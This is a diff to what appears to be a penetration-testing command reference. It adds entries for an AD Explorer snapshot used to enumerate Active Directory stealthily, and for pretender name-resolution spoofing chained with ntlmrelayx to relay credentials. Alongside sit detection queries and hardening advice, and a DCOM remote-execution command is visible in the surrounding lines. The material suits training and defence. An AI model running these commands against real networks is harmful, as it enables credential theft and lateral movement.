@@ -3641,6 +3641,111 @@ const COMMAND_DATA = {
       "explain": "Enumerates AD with raw .NET DirectoryServices - no tools needed:\n  PdcRoleOwner.Name + distinguishedName   build an LDAP path to the PDC and domain root\n  New-Object DirectoryEntry($LDAP)         bind to the directory\n  DirectorySearcher.filter = \"(samAccountType=805306368)\"   filter (here: user accounts)\n  .FindAll()                               run the query\nA fully living-off-the-land LDAP query when PowerView/RSAT are unavailable; change the filter for other object classes."
     },
     {
+      "id": "ad-adexplorer-snapshot",
+      "name": "AD Explorer Snapshot - Offline AD Enumeration & BloodHound",
+      "command": "ADExplorer.exe -snapshot \"\" snapshot.dat /accepteula",
+      "description": "Sysinternals AD Explorer takes a point-in-time snapshot of the entire Active Directory database to a single file. The snapshot can be browsed offline (no further DC contact) and converted with ADExplorerSnapshot.py into BloodHound-ingestible JSON. A stealthy collection option: one legitimate-looking signed Sysinternals tool pulls everything, and all analysis happens offline.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "Enumeration",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "Sysinternals AD Explorer; c3c/ADExplorerSnapshot.py",
+      "tags": [
+        "adexplorer",
+        "sysinternals",
+        "snapshot",
+        "bloodhound",
+        "offline",
+        "ldap",
+        "enumeration"
+      ],
+      "mitre": [
+        "T1087.002",
+        "T1069.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== TAKE A SNAPSHOT (GUI or CLI) ===\n  # GUI: File > Create Snapshot, or CLI:\n  ADExplorer.exe -snapshot \"\" C:\\Windows\\Temp\\snapshot.dat /accepteula\n  # Connect to a specific DC:\n  ADExplorer.exe -snapshot \"<dc_host>\" snapshot.dat /accepteula\n\n=== WHY IT IS STEALTHY ===\n  # - Signed Microsoft Sysinternals binary (often allowlisted)\n  # - One LDAP pull instead of SharpHound bursts\n  # - All graph analysis happens OFFLINE from the .dat file\n\n=== BROWSE OFFLINE ===\n  # Reopen the .dat in AD Explorer with no DC connection to inspect objects/ACLs/attributes\n\n=== CONVERT FOR BLOODHOUND ===\n  pip install adexplorersnapshot\n  ADExplorerSnapshot.py snapshot.dat -o bloodhound_out/\n  # Produces users/groups/computers/etc JSON -> import into BloodHound\n  # Objects-only (no ACL/edge processing) for huge DBs:\n  ADExplorerSnapshot.py snapshot.dat -o out/ -m Objects\n\n=== THEN ANALYZE ===\n  # Import JSON into BloodHound CE, run PlumHound for reports\n\n=== ALTERNATIVES ===\n  SharpHound / bloodhound-python   # direct collection (noisier)\n  ldapsearch / ldeep               # targeted offline-able queries",
+      "examples": [
+        {
+          "label": "Take an AD snapshot",
+          "command": "ADExplorer.exe -snapshot \"\" C:\\Windows\\Temp\\snapshot.dat /accepteula"
+        },
+        {
+          "label": "Convert snapshot to BloodHound JSON",
+          "command": "ADExplorerSnapshot.py snapshot.dat -o bloodhound_out/"
+        },
+        {
+          "label": "Objects-only mode for large DBs",
+          "command": "ADExplorerSnapshot.py snapshot.dat -o out/ -m Objects"
+        }
+      ],
+      "references": [
+        {
+          "title": "AD Explorer (Sysinternals)",
+          "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer"
+        },
+        {
+          "title": "ADExplorerSnapshot.py",
+          "url": "https://github.com/c3c/ADExplorerSnapshot.py"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-sharphound",
+          "note": "SharpHound is the direct (noisier) collection alternative.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-bloodhound-ce",
+          "note": "Import the converted snapshot into BloodHound.",
+          "rel": "next"
+        },
+        {
+          "id": "ad-plumhound",
+          "note": "Generate reports from the ingested graph.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Any authenticated user can read most AD objects and attributes via LDAP. AD Explorer performs one broad, legitimate-looking LDAP read to a snapshot file; the heavy analysis then happens offline, out of reach of DC-side monitoring.",
+        "prerequisites": "Any domain user credentials; AD Explorer binary; network access to a DC.",
+        "impact": "Complete offline copy of the directory (users, groups, computers, ACLs, attributes) enabling full attack-path analysis without repeated DC queries.",
+        "detection": "[MITRE T1087.002/T1069.002] A single very large LDAP result set / full-subtree query from one host; AD Explorer process execution; 1644 (LDAP search) events showing a bulk directory read.",
+        "artifacts": "ADExplorer.exe on disk; a large .dat snapshot file; a single bulk LDAP query rather than SharpHound-style bursts.",
+        "splunk_spl": "index=windows EventCode=4688 (NewProcessName=\"*ADExplorer*\")\n| table _time, SubjectUserName, NewProcessName, CommandLine",
+        "elastic_kql": "process.name:*ADExplorer* or process.command_line:*-snapshot*",
+        "sentinel_kql": "DeviceProcessEvents\n| where FileName has \"ADExplorer\" or ProcessCommandLine has \"-snapshot\"\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+        "sigma_rules": "win_adexplorer_snapshot_collection",
+        "prevention": "Monitor for bulk/full-subtree LDAP queries (enable 1644 with thresholds); restrict who can read sensitive attributes; application allowlisting that flags Sysinternals misuse; reduce ACL attack surface so a full copy yields fewer paths.",
+        "sources": [
+          "Sysinternals docs",
+          "https://attack.mitre.org/techniques/T1087/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "AD Explorer snapshot collection",
+            "logic": "DeviceProcessEvents\n| where FileName has \"ADExplorer\" or ProcessCommandLine has \"-snapshot\"\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1087.002",
+              "T1069.002"
+            ],
+            "fidelity": "signature",
+            "confidence": "medium",
+            "false_positives": "Legitimate AD administration/auditing with AD Explorer",
+            "tuning": "Correlate with a bulk LDAP read (1644) from the same host; alert on non-admin usage"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-dcom-exec",
       "name": "AD Lateral Movement - DCOM Execution via MMC20.Application",
       "command": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"<target_ip>\"))\n$dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\", $null, \"/c <payload>\", \"7\")",
@@ -123493,6 +123598,110 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "ad-pretender",
+      "name": "pretender - Modern LLMNR/mDNS/DNS/DHCPv6 Spoofing for MitM",
+      "command": "pretender -i <interface>",
+      "description": "pretender is a modern Go-based man-in-the-middle tool that spoofs LLMNR, mDNS, NetBIOS-NS, and DHCPv6/DNS to redirect victims to the attacker, primarily to feed relay tools like ntlmrelayx or Responder. It is designed to work alongside (not replace) Responder/mitm6, with fine-grained targeting and spoofing controls to reduce noise and avoid breaking the network.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Active Directory",
+      "subcategory": "Lateral Movement",
+      "certifications": [
+        "CPTS",
+        "CRTP"
+      ],
+      "primary_cert": "CPTS",
+      "source": "RedTeamPentesting/pretender",
+      "tags": [
+        "pretender",
+        "mitm",
+        "llmnr",
+        "mdns",
+        "dhcpv6",
+        "spoofing",
+        "ntlm-relay",
+        "ipv6"
+      ],
+      "mitre": [
+        "T1557.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== BASIC (spoof everything on an interface) ===\n  pretender -i eth0\n\n=== DHCPv6 + DNS TAKEOVER (mitm6-style, relay to LDAP) ===\n  pretender -i eth0 --spoof-types DHCPv6 DNS\n  # Pair with ntlmrelayx targeting LDAPS for delegation/ACL abuse\n\n=== TARGETED SPOOFING (reduce noise) ===\n  pretender -i eth0 --spoof <victim_ip> --dont-spoof <gateway_ip>\n  pretender -i eth0 --spoof-for <victim_host>\n\n=== LIMIT PROTOCOLS ===\n  pretender -i eth0 --no-mdns --no-netbios      # LLMNR only\n  pretender -i eth0 --spoof-types LLMNR mDNS\n\n=== REDIRECT TO A SPECIFIC RELAY/HOST ===\n  pretender -i eth0 --ipv4 <lhost> --ipv6 <lhost_v6>\n\n=== TYPICAL CHAIN (relay) ===\n  # Terminal 1: relay captured auth to LDAPS\n  ntlmrelayx.py -t ldaps://<dc_ip> --delegate-access --no-smb-server -6\n  # Terminal 2: poison name resolution toward us\n  pretender -i eth0 --spoof-types DHCPv6 DNS\n\n=== ALTERNATIVES ===\n  Responder    # classic LLMNR/NBT-NS poisoner + capture\n  mitm6        # DHCPv6/DNS IPv6 takeover\n  Inveigh      # Windows/PowerShell equivalent",
+      "examples": [
+        {
+          "label": "Spoof all on interface",
+          "command": "pretender -i eth0"
+        },
+        {
+          "label": "DHCPv6/DNS takeover for relay",
+          "command": "pretender -i eth0 --spoof-types DHCPv6 DNS"
+        },
+        {
+          "label": "Targeted, low-noise spoofing",
+          "command": "pretender -i eth0 --spoof 10.10.10.50 --dont-spoof 10.10.10.1"
+        }
+      ],
+      "references": [
+        {
+          "title": "pretender",
+          "url": "https://github.com/RedTeamPentesting/pretender"
+        },
+        {
+          "title": "MITRE T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay",
+          "url": "https://attack.mitre.org/techniques/T1557/001/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-responder-poison",
+          "note": "Responder is the classic LLMNR/NBT-NS alternative.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-mitm6-ipv6-takeover",
+          "note": "mitm6 is the established DHCPv6/DNS takeover tool.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-inveigh-ps",
+          "note": "Inveigh is the Windows-side equivalent.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "LLMNR, mDNS, NBT-NS, and DHCPv6 are trust-on-first-response broadcast/multicast protocols with no authentication. An attacker on the segment answers first, redirecting victims and capturing or relaying their authentication.",
+        "prerequisites": "Layer-2 access to the victim segment; a relay target for captured auth.",
+        "impact": "Capture of NetNTLM hashes (offline crack) or live relay to LDAP/SMB for delegation, ACL abuse, or lateral movement.",
+        "detection": "[MITRE T1557.001] Rogue responses to LLMNR (UDP 5355), mDNS (5353), NBT-NS (137), and unsolicited DHCPv6 advertisements/DNS from a non-DHCP host; a host answering name queries for many different names.",
+        "artifacts": "Spoofed name-resolution replies; sudden IPv6 default DNS pointing to a workstation; NTLM auth to an unexpected host.",
+        "splunk_spl": "index=network (dest_port=5355 OR dest_port=5353 OR dest_port=137 OR dest_port=547)\n| stats dc(query) as names count by src_ip\n| where names > 20",
+        "elastic_kql": "network.protocol:(llmnr or mdns or dhcpv6) and source.ip:*",
+        "sentinel_kql": "DeviceNetworkEvents\n| where RemotePort in (5355,5353,137,547)\n| summarize Names=dcount(RemoteUrl) by InitiatingProcessAccountName, LocalIP, bin(Timestamp, 10m)\n| where Names > 20",
+        "sigma_rules": "net_llmnr_nbtns_poisoning",
+        "prevention": "Disable LLMNR (GPO), NBT-NS, and mDNS where unused; disable IPv6 or configure DHCPv6 Guard/RA Guard; enable SMB signing and LDAP channel binding/signing to defeat relay; segment and monitor broadcast domains.",
+        "sources": [
+          "RedTeamPentesting",
+          "https://attack.mitre.org/techniques/T1557/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Name-resolution poisoning (pretender/Responder/mitm6)",
+            "logic": "DeviceNetworkEvents\n| where RemotePort in (5355,5353,137,547)\n| summarize DistinctNames=dcount(RemoteUrl), Events=count() by DeviceName, LocalIP, bin(Timestamp, 10m)\n| where DistinctNames > 20",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1557.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate mDNS-heavy environments (printers, casting)",
+            "tuning": "Alert when a single non-infrastructure host answers many distinct name queries or advertises DHCPv6/DNS"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "windows",
       "requires": [
@@ -191074,8 +191283,8 @@ const COMMAND_DATA = {
       }
     }
   ],
-  "totalCommands": 1072,
-  "buildDate": "2026-11-11T05:16:42.447Z",
+  "totalCommands": 1074,
+  "buildDate": "2026-11-11T05:18:51.923Z",
   "certifications": [
     "CDSA",
     "CPTS",
